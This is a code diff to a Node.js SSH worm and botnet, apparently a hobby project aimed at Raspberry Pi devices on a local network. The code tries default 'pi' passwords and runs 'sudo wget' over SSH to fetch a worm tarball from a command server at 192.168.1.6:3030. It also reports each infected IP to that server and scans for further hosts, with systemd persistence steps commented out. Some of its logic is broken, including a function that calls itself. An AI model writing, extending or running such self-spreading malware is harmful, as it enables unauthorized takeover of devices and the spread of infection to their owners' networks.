@@ -4,13 +4,14 @@ var tcPing = require('tcp-ping');
 var nodeSsh = require('node-ssh');
 var http = require('http');
 const ssh = new nodeSsh();
+const axios = require('axios').default;
 
 const passwords = [
     "raspberry",
     "password"
 ]
 let ipAddress;
-const commandServer = "localhost:3030";
+const commandServer = "192.168.1.6:3030";
 
 /**
  * Attempts to connect to the remote machine to propagate the worm
@@ -20,40 +21,43 @@ const attemptConnect = async (ipAddress) => {
     const password = 'raspberry';
     return new Promise(async (resolve, reject) => {
         try {
-            await ssh.connect({
-                host: ipAddress,
-                port: 22,
-                username: 'pi',
-                password: password
-            });
-            const wormDirectory = '/worm';
-            const sshOptions = {
-                cwd: wormDirectory
-            };
-            const ls = await ssh.execCommand('ls', [wormDirectory]);
-            if (ls.stderr) {
-                console.log("dne");
-                // create worm directory
-                await ssh.exec('sudo', ['mkdir', wormDirectory]);
+            if (await attemptConnect(ipAddress)) {
+                await ssh.connect({
+                    host: ipAddress,
+                    port: 22,
+                    username: 'pi',
+                    password: password
+                });
+                const wormDirectory = '/worm';
+                const sshOptions = {
+                    cwd: wormDirectory
+                };
+                const ls = await ssh.execCommand(`ls ${wormDirectory}`);
+                console.log(ls);
+                if (ls.stderr) {
+                    console.log("dne");
+                    // create worm directory
+                    await ssh.exec('sudo', ['mkdir', wormDirectory]);
 
-                // get the executable
-                await ssh.exec('sudo', ['wget', `hostaddress`], sshOptions);
-                await ssh.exec('sudo', ['tar', '-xvzf'], sshOptions);
+                    // get the executable
+                    const wget = await ssh.execCommand(`sudo wget -O worm.tar.gz ${commandServer}/sendFile`, sshOptions);
+                    console.log(wget);
+                    await ssh.exec('sudo', ['tar', '-xf', 'worm.tar.gz'], sshOptions);
+                    await ssh.exec('sudo', ['echo', '#!/bin/bash\ncd'])
 
-                // create a system service to run the executable
-                await ssh.execCommand('echo "[Unit]\nDescription=Echos Hello World\n\n[Service]\nType=simple\nExecStart=/worm/bat.sh\n\n[Install]\nWantedBy=multi-user.target" > test.service');
-                await ssh.execCommand('sudo mv test.service /etc/systemd/system');
-                await ssh.execCommand('sudo systemctl daemon-reload');
+                    // // create a system service to run the executable
+                    // await ssh.execCommand('echo "[Unit]\nDescription=Echos Hello World\n\n[Service]\nType=simple\nExecStart=/worm/bat.sh\n\n[Install]\nWantedBy=multi-user.target" > test.service');
+                    // await ssh.execCommand('sudo mv test.service /etc/systemd/system');
+                    // await ssh.execCommand('sudo systemctl daemon-reload');
 
-                // enable the executable to start on restarts
-                await ssh.execCommand('sudo systemctl enable test');
+                    // // enable the executable to start on restarts
+                    // await ssh.execCommand('sudo systemctl enable test');
 
-                // start the executable
-                await ssh.execCommand('sudo systemctl start test');
+                    // // start the executable
+                    // await ssh.execCommand('sudo systemctl start test');
+                }
+                ssh.dispose();
             }
-
-
-            ssh.dispose();
             resolve(true);
         } catch (ex) {
             ssh.dispose();
@@ -119,8 +123,8 @@ const attack = (target) => {
  * On start sends a post to the command server so it knows the bot is live
  * @param {string} serverAddress The ip address for the command server
  */
-const connectToServer = (serverAddress) => {
-
+const connectToServer = (localIp) => {
+    axios.post(`${commandServer}/landing`, { ip: localIp, infectedIp: "192.168.1.6" });
 }
 
 const getLocalIp = () => {
@@ -143,9 +147,10 @@ const getLocalIp = () => {
 const startBotnet = async () => {
     if (process.argv.length === 3) {
         ipAddress = process.argv[2];
-        attemptConnect(ipAddress).catch(ex => {});
+        attemptConnect(ipAddress).catch(ex => { });
     } else {
-        const localIp = await getLocalIp()
+        const localIp = await getLocalIp();
+        connectToServer(localIp);
         scan(localIp);
     }
 }
